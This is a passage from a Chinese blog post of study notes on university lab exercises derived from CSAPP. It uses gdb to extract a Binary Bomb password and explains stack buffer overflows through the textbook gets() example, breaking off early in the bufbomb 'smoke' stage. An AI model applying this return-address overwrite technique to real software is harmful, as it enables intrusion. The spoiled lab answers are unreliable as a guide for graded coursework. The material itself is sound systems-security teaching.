
 <!DOCTYPE HTML>
<html >
<head>
  <meta charset="UTF-8">
  
    <title>CSAPP - Buffer Overflow Attacks | Tada!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="Zijie0">
    
    <meta name="description" itemprop="description" content="又是Coursera课的解题笔记，来自华盛顿大学The Hardware/Software Interface这门课程。这门课的作业移植了CSAPP这本书上实验题的精华部分，很有挑战也非常有趣！值得强烈推荐一下！">
    
    
    
    
    <link rel="alternative" href="/atom.xml" title="Tada!" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css" type="text/css">

</head>

  <body>
    <header>
      <div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="Tada!" title="Tada!"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Tada!">Tada!</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Main</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" autocomplete="off" name="q" maxlength="20" placeholder="Search" />
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2014/08/04/CSAPP---Buffer-Overflow-Attacks/" title="CSAPP - Buffer Overflow Attacks" itemprop="url">CSAPP - Buffer Overflow Attacks</a>
  </h1>
  <p class="article-author">By
       
		<a href="http://zijie0.github.io/about" title="Zijie0" target="_blank" itemprop="author">Zijie0</a>
		
  <p class="article-time">
    <time datetime="2014-08-04T04:45:22.000Z" itemprop="datePublished"> Published Aug 4 2014</time>
    
  </p>
</header>
	<div class="article-content">
		
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">Contents</strong>
		
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Binary_Bomb"><span class="toc-number">1.</span> <span class="toc-text">Binary Bomb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer_Overflow"><span class="toc-number">2.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smoke"><span class="toc-number">2.2.</span> <span class="toc-text">smoke</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fizz"><span class="toc-number">2.3.</span> <span class="toc-text">fizz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bang"><span class="toc-number">2.4.</span> <span class="toc-text">bang</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamite"><span class="toc-number">2.5.</span> <span class="toc-text">dynamite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完结"><span class="toc-number">3.</span> <span class="toc-text">完结</span></a></li></ol>
		
		</div>
		
		<h2 id="Binary_Bomb">Binary Bomb</h2>
<p>上周Lab2的作业是模拟一个binary bomb，运行后提示输入密码，如果正确就会进入下一关，否则就会爆炸。目标就是通过gdb查看程序运行过程中的逻辑，找出正确的密码顺利通关。那次做作业没有做详细的笔记，就大致说一下思路吧！</p>
<p>做之前看看介绍，提到可以用 <code>objdump -d ./bomb</code> 来生成反编译后的汇编代码，然后整个程序中的各种function name基本都有了，方便后面设断点。具体的代码还是边调试边看比较直观。另外 <code>strings -t x ./bomb</code> 可以打出程序中所有定义的字符串等信息，最后一个隐藏关卡的密码就可以从里面找出来哈哈！</p>
<p>首先跑 <code>gdb ./bomb</code> 进入gdb，设置下断点：<code>b phase_1</code>，然后开始跑程序，随便输入个字符串比如’aaaa’，接下来就是不停用 <code>si</code> 或者设断点的方式看代码了。比如在第一关，可以看到进入<code>phase_1</code>后又调用了<code>strings_not_equal</code>函数，然后看一下 <code>disas</code>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function strings_not_equal:</div><div class="line">   <span class="number">0x000000000040123d</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">mov</span>    %<span class="literal">rbx</span>,-<span class="number">0x18</span>(%<span class="literal">rsp</span>)</div><div class="line">   <span class="number">0x0000000000401242</span> &lt;+<span class="number">5</span>&gt;: <span class="keyword">mov</span>    %<span class="literal">rbp</span>,-<span class="number">0x10</span>(%<span class="literal">rsp</span>)</div><div class="line">   <span class="number">0x0000000000401247</span> &lt;+<span class="number">10</span>&gt;:    <span class="keyword">mov</span>    %<span class="literal">r12</span>,-<span class="number">0x8</span>(%<span class="literal">rsp</span>)</div><div class="line">   <span class="number">0x000000000040124c</span> &lt;+<span class="number">15</span>&gt;:    <span class="keyword">sub</span>    <span class="number">$0</span>x18,%<span class="literal">rsp</span></div><div class="line">=&gt; <span class="number">0x0000000000401250</span> &lt;+<span class="number">19</span>&gt;:    <span class="keyword">mov</span>    %<span class="literal">rdi</span>,%<span class="literal">rbx</span></div><div class="line">   <span class="number">0x0000000000401253</span> &lt;+<span class="number">22</span>&gt;:    <span class="keyword">mov</span>    %<span class="literal">rsi</span>,%<span class="literal">rbp</span></div><div class="line">   <span class="number">0x0000000000401256</span> &lt;+<span class="number">25</span>&gt;:    callq  <span class="number">0x401221</span> &lt;string_length&gt;</div></pre></td></tr></table></figure>


<p>这个<code>$rdi</code>寄存器（一般用来传变量给函数）里放了啥呢？</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x /s $<span class="literal">rdi</span></div><div class="line"><span class="number">0x602f40</span> &lt;input_strings&gt;:    <span class="string">"aaaa"</span></div></pre></td></tr></table></figure>


<p>恩，原来就是我输入的内容。继续往下走。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">   <span class="number">0x0000000000401256</span> &lt;+<span class="number">25</span>&gt;:    callq  <span class="number">0x401221</span> &lt;string_length&gt;</div><div class="line">=&gt; <span class="number">0x000000000040125b</span> &lt;+<span class="number">30</span>&gt;:    <span class="keyword">mov</span>    %<span class="number">eax</span>,%<span class="literal">r12d</span></div><div class="line">   <span class="number">0x000000000040125e</span> &lt;+<span class="number">33</span>&gt;:    <span class="keyword">mov</span>    %<span class="literal">rbp</span>,%<span class="literal">rdi</span></div><div class="line">   <span class="number">0x0000000000401261</span> &lt;+<span class="number">36</span>&gt;:    callq  <span class="number">0x401221</span> &lt;string_length&gt;</div><div class="line">   <span class="number">0x0000000000401266</span> &lt;+<span class="number">41</span>&gt;:    <span class="keyword">mov</span>    <span class="number">$0</span>x1,%<span class="number">edx</span></div><div class="line">   <span class="number">0x000000000040126b</span> &lt;+<span class="number">46</span>&gt;:    <span class="keyword">cmp</span>    %<span class="number">eax</span>,%<span class="literal">r12d</span></div></pre></td></tr></table></figure>


<p>跑完string_length后看下<code>$eax</code>里的值是啥：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p /x <span class="variable">$eax</span></div><div class="line"><span class="variable">$6</span> = <span class="number">0</span>x4</div></pre></td></tr></table></figure>


<p>然后又挪了<code>$rbp</code>里的值去调用<code>string_length</code>，所以这里意图应该是挺明显的，就是想先比较下用户输入和正确密码的长度看看是否相等，正确密码就在<code>$rbp</code>里啦！</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x /s $<span class="literal">rbp</span></div><div class="line"><span class="number">0x401af8</span> &lt;__dso_handle+<span class="number">496</span>&gt;:     <span class="string">"Science isn't about why, it's about why not?"</span></div></pre></td></tr></table></figure>


<p>这样就完成一关啦！如果懒得重新输入可以直接在gdb里改了密码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">(gdb) x /s $<span class="literal">rdi</span></div><div class="line"><span class="number">0x602f40</span> &lt;input_strings&gt;:    <span class="string">"aaaa"</span></div><div class="line">(gdb) set $<span class="literal">rbp</span>=$<span class="literal">rdi</span></div><div class="line">(gdb) x /s $<span class="literal">rbp</span></div><div class="line"><span class="number">0x602f40</span> &lt;input_strings&gt;:    <span class="string">"aaaa"</span></div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"> </div><div class="line">Breakpoint <span class="number">2</span>, <span class="number">0x000000000040123b</span> <span class="keyword">in</span> string_length ()</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Phase <span class="number">1</span> defused. How about the next one?</div></pre></td></tr></table></figure>


<p>其它关卡大同小异，有时候不知道具体要输入什么还可以看看程序在调用<code>sscanf</code>时用的format string是啥。后面机关有循环，有switch表，有递归，有数组指针，链表排序之类的……有时候代码逻辑还是挺复杂的，不过只要找一下密码的话还是不难，仔细有耐心一点基本都能搞定。</p>
<h2 id="Buffer_Overflow">Buffer Overflow</h2>
<h3 id="原理">原理</h3>
<p>Lab3的作业也是用汇编来搞，不过内容变成了做buffer overflow的攻击！大致看一下原理，如下是一个手绘stack……</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="number">804854</span>e:    call    <span class="number">8048</span>b90 &lt;main&gt;</div><div class="line"><span class="number">8048553</span>:    pushl   %eax</div><div class="line"> </div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x110     <span class="string">|             |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x10c     <span class="string">|             |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x108     <span class="string">|     123     |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"> </div><div class="line">          <span class="string">|-------------|</span></div><div class="line">%esp      <span class="string">|    0x108    |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"> </div><div class="line">          <span class="string">|-------------|</span></div><div class="line">%eip      <span class="string">|  0x804854e  |</span></div><div class="line">          <span class="string">|-------------|</span></div></pre></td></tr></table></figure>


<p>调用函数前，先把返回地址<code>pushl</code>到stack，也就是<code>call</code>的下一行<code>0x8048553</code>，把<code>%esp</code>的值改成当前的栈顶（由于stack是在高位地址，这里栈顶反而是最小地址值也就是<code>-0x4(%esp)</code>），然后跳转到被调用的函数的地址<code>0x8048b90</code>去执行代码。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x110     <span class="string">|             |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x10c     <span class="string">|             |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x108     <span class="string">|     123     |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x104     <span class="string">|  0x8048553  |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"> </div><div class="line">          <span class="string">|-------------|</span></div><div class="line">%esp      <span class="string">|    0x104    |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"> </div><div class="line">          <span class="string">|-------------|</span></div><div class="line">%eip      <span class="string">|  0x8048b90  |</span></div><div class="line">          <span class="string">|-------------|</span></div></pre></td></tr></table></figure>


<p>当跑到return时<code>%eip</code>的值为<code>0x8048591</code>，返回地址会从stack上<code>pop</code>出来放到<code>%eip</code>里，同时<code>%esp</code>也会在<code>pop</code>后变回<code>0x108</code>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="number">8048591</span>:    ret</div><div class="line"> </div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x110     <span class="string">|             |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x10c     <span class="string">|             |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x108     <span class="string">|     123     |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"><span class="number">0</span>x104     <span class="string">|  0x8048553  |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"> </div><div class="line">          <span class="string">|-------------|</span></div><div class="line">%esp      <span class="string">|    0x108    |</span></div><div class="line">          <span class="string">|-------------|</span></div><div class="line"> </div><div class="line">          <span class="string">|-------------|</span></div><div class="line">%eip      <span class="string">|  0x8048553  |</span></div><div class="line">          <span class="string">|-------------|</span></div></pre></td></tr></table></figure>


<p>Hmm…实际的stack要更复杂点，return address下面会跟一个<code>%ebp</code>指向的地址，里面存的是函数调用方（也就是上一个stack frame）的<code>%ebp</code>值，<code>%ebp</code>与<code>%esp</code>之间会有callee保存的寄存器内容，local variables，对它要调用的函数准备的arguments之类的信息……整个过程中<code>%ebp</code>基本就是一个基准，可以看到很多代码里会有<code>-0x18(%ebp)</code>之类的来定位stack上变量的地址，而<code>%esp</code>会一直指向栈顶，比如在读取用户输入时会建立一个数组什么的假设是<code>char[16]</code>，然后对应就会执行<code>subl $16,%esp</code>来使栈顶向下移动16bytes，这段buffer就用来存放用户的输入。例如下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> echo() {</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</div><div class="line">    gets(buf);</div><div class="line">    <span class="built_in">puts</span>(buf);</div><div class="line">}</div><div class="line"> </div><div class="line">echo:</div><div class="line">    pushl   %ebp            <span class="preprocessor"># Save %ebp on stack</span></div><div class="line">    movl    %esp, %ebp</div><div class="line">    pushl   %ebx            <span class="preprocessor"># Save %ebx</span></div><div class="line">    leal    -<span class="number">8</span>(%ebp), %ebx  <span class="preprocessor"># Compute buf as %ebp-8</span></div><div class="line">    subl    $<span class="number">20</span>, %esp       <span class="preprocessor"># Allocate stack space</span></div><div class="line">    movl    %ebx, (%esp)    <span class="preprocessor"># Push buf addr on stack</span></div><div class="line">    call    gets            <span class="preprocessor"># Call gets</span></div><div class="line"> </div><div class="line">                |-------------------|</div><div class="line"><span class="number">0xffffc658</span>      |    Stack Frame    |</div><div class="line">                |      <span class="keyword">for</span> main     |</div><div class="line">                |-------------------|</div><div class="line">Return Addr     | f7 | <span class="number">85</span> | <span class="number">04</span> | <span class="number">08</span> |</div><div class="line">                |-------------------|</div><div class="line"><span class="number">0xffffc638</span>      | <span class="number">58</span> | c6 | ff | ff |</div><div class="line">                |-------------------|</div><div class="line">                |     Saved %ebx    |</div><div class="line">                |-------------------|</div><div class="line">buf             | xx | xx | xx | xx |</div><div class="line">                |-------------------|</div><div class="line">                |                   |</div><div class="line">                |                   |</div><div class="line">                |                   |</div><div class="line">                |                   |</div><div class="line">                |-------------------|</div><div class="line">buf addr        |     <span class="number">0xffffc630</span>    |</div><div class="line">                |-------------------|</div></pre></td></tr></table></figure>


<p>作为业界良心，还是把图画了一下……之所以叫buffer overflow攻击，也就是因为gets在执行时如果没有检查用户输入大小而任由写入内存，当把buf那四个bytes写满后就会写到saved <code>%ebx</code>那里！如果继续往下写，就可以改变return addr，跳转到你任意想跳转到的函数地址！具体可以参考wiki上的<a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="external">词条</a>或者直接去看这门课的视频，老师讲的很清晰很全面！这里就不展开另外讲寄存器值保存，地址对齐之类的细节了。本来懒得画图就搜了下别人的blog，发现<a href="http://duartes.org/gustavo/blog/post/epilogues-canaries-buffer-overflows/" target="_blank" rel="external">这篇</a>里面的图画的很好……也可以参考借鉴。</p>
<p>=================== ！！！以下将进入解题剧透环节！！！ ===================</p>
<h3 id="smoke">smoke</h3>
<p>第一个挑战，预热一下，目的就是改那个return addr。由于我们要注入地址，代码之类的二进制数据，作业里还很贴心地提供了个ascii转binary的小工具：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="input"><span class="prompt">./sendstring &lt; exploit.txt &gt;</span> exploit.bytes</span></div></pre></td></tr></table></figure>


<p>只要把需要需要注入的hex码写到那个文本文件里就可以生成啦。值得注意的是在Intel CPU上是<a href="http://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F" target="_blank" rel="external">little-endian</a>的字节序，很多地方需要反过来写。我们先随便搞个输入，比如写32个a进去，生成二进制码，然后跑gdb看看：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">gdb ./bufbomb</div><div class="line"> </div><div class="line">(gdb) break getbuf</div><div class="line">(gdb) r -u <span class="number">4999723</span> &lt; exploit.bytes</div><div class="line">(gdb) <span class="literal">si</span> <span class="number">4</span></div><div class="line"> </div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   <span class="number">0x0000000000400da0</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">push</span>   %<span class="literal">rbp</span></div><div class="line">   <span class="number">0x0000000000400da1</span> &lt;+<span class="number">1</span>&gt;: <span class="keyword">mov</span>    %<span class="literal">rsp</span>,%<span class="literal">rbp</span></div><div class="line">   <span class="number">0x0000000000400da4</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">sub</span>    <span class="number">$0</span>x30,%<span class="literal">rsp</span></div><div class="line">   <span class="number">0x0000000000400da8</span> &lt;+<span class="number">8</span>&gt;: <span class="keyword">lea</span>    -<span class="number">0x30</span>(%<span class="literal">rbp</span>),%<span class="literal">rdi</span></div><div class="line">=&gt; <span class="number">0x0000000000400dac</span> &lt;+<span class="number">12</span>&gt;:    callq  <span class="number">0x400cb0</span> &lt;Gets&gt;</div><div class="line">   <span class="number">0x0000000000400db1</span> &lt;+<span class="number">17</span>&gt;:    movabs <span class="number">$0</span>xcccccccccccccccd,%<span class="literal">rdx</span></div><div class="line">   <span class="number">0x0000000000400dbb</span> &lt;+<span class="number">27</span>&gt;:    <span class="keyword">mov</span>    %<span class="literal">rax</span>,%<span class="literal">rcx</span></div><div class="line">   <span class="number">0x0000000000400dbe</span> &lt;+<span class="number">30</span>&gt;:    <span class="keyword">mul</span>    %<span class="literal">rdx</span></div><div class="line">   <span class="number">0x0000000000400dc1</span> &lt;+<span class="number">33</span>&gt;:    <span class="keyword">shr</span>    <span class="number">$0</span>x5,%<span class="literal">rdx</span></div><div class="line">   <span class="number">0x0000000000400dc5</span> &lt;+<span class="number">37</span>&gt;:    <span class="keyword">lea</span>    (%<span class="literal">rdx</span>,%<span class="literal">rdx</span>,<span class="number">4</span>),%<span class="literal">rax</span></div><div class="line">   <span class="number">0x0000000000400dc9</span> &lt;+<span class="number">41</span>&gt;:    <span class="keyword">mov</span>    %<span class="literal">rcx</span>,%<span class="literal">rdx</span></div><div class="line">   <span class="number">0x0000000000400dcc</span> &lt;+<span class="number">44</span>&gt;:    <span class="keyword">shl</span>    <span class="number">$0</span>x3,%<span class="literal">rax</span></div><div class="line">   <span class="number">0x0000000000400dd0</span> &lt;+<span class="number">48</span>&gt;:    <span class="keyword">sub</span>    %<span class="literal">rax</span>,%<span class="literal">rdx</span></div><div class="line">   <span class="number">0x0000000000400dd3</span> &lt;+<span class="number">51</span>&gt;:    <span class="keyword">mov</span>    <span class="number">$0</span>x24,%<span class="number">eax</span></div><div class="line">   <span class="number">0x0000000000400dd8</span> &lt;+<span class="number">56</span>&gt;:    <span class="keyword">cmp</span>    <span class="number">$0</span>x24,%<span class="literal">rdx</span></div><div class="line">   <span class="number">0x0000000000400ddc</span> &lt;+<span class="number">60</span>&gt;:    <span class="keyword">cmovae</span> %<span class="literal">rdx</span>,%<span class="literal">rax</span></div><div class="line">   <span class="number">0x0000000000400de0</span> &lt;+<span class="number">64</span>&gt;:    <span class="keyword">xor</span>    %<span class="number">ecx</span>,%<span class="number">ecx</span></div><div class="line">   <span class="number">0x0000000000400de2</span> &lt;+<span class="number">66</span>&gt;:    <span class="keyword">add</span>    <span class="number">$0</span>x1e,%<span class="literal">rax</span></div><div class="line">   <span class="number">0x0000000000400de6</span> &lt;+<span class="number">70</span>&gt;:    <span class="keyword">and</span>    <span class="number">$0</span>xfffffffffffffff0,%<span class="literal">rax</span></div><div class="line">   <span class="number">0x0000000000400dea</span> &lt;+<span class="number">74</span>&gt;:    <span class="keyword">sub</span>    %<span class="literal">rax</span>,%<span class="literal">rsp</span></div><div class="line">   <span class="number">0x0000000000400ded</span> &lt;+<span class="number">77</span>&gt;:    <span class="keyword">lea</span>    <span class="number">0xf</span>(%<span class="literal">rsp</span>),%<span class="literal">r8</span></div><div class="line">   <span class="number">0x0000000000400df2</span> &lt;+<span class="number">82</span>&gt;:    <span class="keyword">and</span>    <span class="number">$0</span>xfffffffffffffff0,%<span class="literal">r8</span></div><div class="line">   <span class="number">0x0000000000400df6</span> &lt;+<span class="number">86</span>&gt;:    nopw   %<span class="literal">cs</span>:<span class="number">0x0</span>(%<span class="literal">rax</span>,%<span class="literal">rax</span>,<span class="number">1</span>)</div><div class="line">   <span class="number">0x0000000000400e00</span> &lt;+<span class="number">96</span>&gt;:    movzbl -<span class="number">0x30</span>(%<span class="literal">rbp</span>,%<span class="literal">rcx</span>,<span class="number">1</span>),%<span class="literal">edi</span></div><div class="line">   <span class="number">0x0000000000400e05</span> &lt;+<span class="number">101</span>&gt;:   <span class="keyword">lea</span>    (%<span class="literal">r8</span>,%<span class="literal">rcx</span>,<span class="number">1</span>),%<span class="literal">rsi</span></div><div class="line">   <span class="number">0x0000000000400e09</span> &lt;+<span class="number">105</span>&gt;:   <span class="keyword">add</span>    <span class="number">$0</span>x1,%<span class="literal">rcx</span></div><div class="line">   <span class="number">0x0000000000400e0d</span> &lt;+<span class="number">109</span>&gt;:   <span class="keyword">cmp</span>    <span class="number">$0</span>x24,%<span class="literal">rcx</span></div><div class="line">   <span class="number">0x0000000000400e11</span> &lt;+<span class="number">113</span>&gt;:   <span class="keyword">mov</span>    %<span class="literal">dil</span>,(%<span class="literal">rsi</span>)</div><div class="line">   <span class="number">0x0000000000400e14</span> &lt;+<span class="number">116</span>&gt;:   <span class="keyword">jne</span>    <span class="number">0x400e00</span> &lt;getbuf+<span class="number">96</span>&gt;</div><div class="line">   <span class="number">0x0000000000400e16</span> &lt;+<span class="number">118</span>&gt;:   <span class="keyword">mov</span>    %<span class="literal">rdx</span>,%<span class="literal">rax</span></div><div class="line">   <span class="number">0x0000000000400e19</span> &lt;+<span class="number">121</span>&gt;:   leaveq </div><div class="line">   <span class="number">0x0000000000400e1a</span> &lt;+<span class="number">122</span>&gt;:   retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>


<p>我们直接就看<code>Gets</code>获取用户输入返回后的情况吧！</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">(gdb) b *getbuf+<span class="number">17</span></div><div class="line">Breakpoint <span class="number">2</span> <span class="preprocessor">at</span> <span class="number">0x400db1</span>: file bufbomb.c, line <span class="number">137</span>.</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"> </div><div class="line">Breakpoint <span class="number">2</span>, getbuf () <span class="preprocessor">at</span> bufbomb.c:<span class="number">137</span></div><div class="line"><span class="number">137</span>   variable_length = alloca((val % <span class="number">40</span>) &lt; <span class="number">36</span> ? <span class="number">36</span> : val % <span class="number">40</span>)<span class="comment">;</span></div><div class="line">(gdb) i r</div><div class="line"><span class="literal">rax</span>            <span class="number">0x7fffffffb8c0</span>   <span class="number">140737488337088</span></div><div class="line"><span class="literal">rbx</span>            <span class="number">0x497746be</span>   <span class="number">1232553662</span></div><div class="line"><span class="literal">rcx</span>            <span class="number">0x2e</span> <span class="number">46</span></div><div class="line"><span class="literal">rdx</span>            <span class="number">0x379e9b2af0</span> <span class="number">238884170480</span></div><div class="line"><span class="literal">rsi</span>            <span class="number">0xa</span>  <span class="number">10</span></div><div class="line"><span class="literal">rdi</span>            <span class="number">0x379e9b1340</span> <span class="number">238884164416</span></div><div class="line"><span class="literal">rbp</span>            <span class="number">0x7fffffffb8f0</span>   <span class="number">0x7fffffffb8f0</span></div><div class="line"><span class="literal">rsp</span>            <span class="number">0x7fffffffb8c0</span>   <span class="number">0x7fffffffb8c0</span></div><div class="line"><span class="literal">r8</span>             <span class="number">0x7ffff7fdc740</span>   <span class="number">140737353992000</span></div><div class="line"><span class="literal">r9</span>             <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">r10</span>            <span class="number">0x22</span> <span class="number">34</span></div><div class="line"><span class="literal">r11</span>            <span class="number">0x246</span>    <span class="number">582</span></div><div class="line"><span class="literal">r12</span>            <span class="number">0x607f80</span> <span class="number">6324096</span></div><div class="line"><span class="literal">r13</span>            <span class="number">0x7fffffffe6f0</span>   <span class="number">140737488348912</span></div><div class="line"><span class="literal">r14</span>            <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">r15</span>            <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">rip</span>            <span class="number">0x400db1</span> <span class="number">0x400db1</span> &lt;getbuf+<span class="number">17</span>&gt;</div><div class="line">eflags         <span class="number">0x246</span>    [ PF ZF IF ]</div><div class="line"><span class="literal">cs</span>             <span class="number">0x33</span> <span class="number">51</span></div><div class="line"><span class="literal">ss</span>             <span class="number">0x2b</span> <span class="number">43</span></div><div class="line"><span class="literal">ds</span>             <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">es</span>             <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">fs</span>             <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">gs</span>             <span class="number">0x0</span>  <span class="number">0</span></div></pre></td></tr></table></figure>


<p>可以看到目前的<code>%rsp</code>, <code>%rbp</code>的值，查看下我们的输入是不是被放进去了：</p>
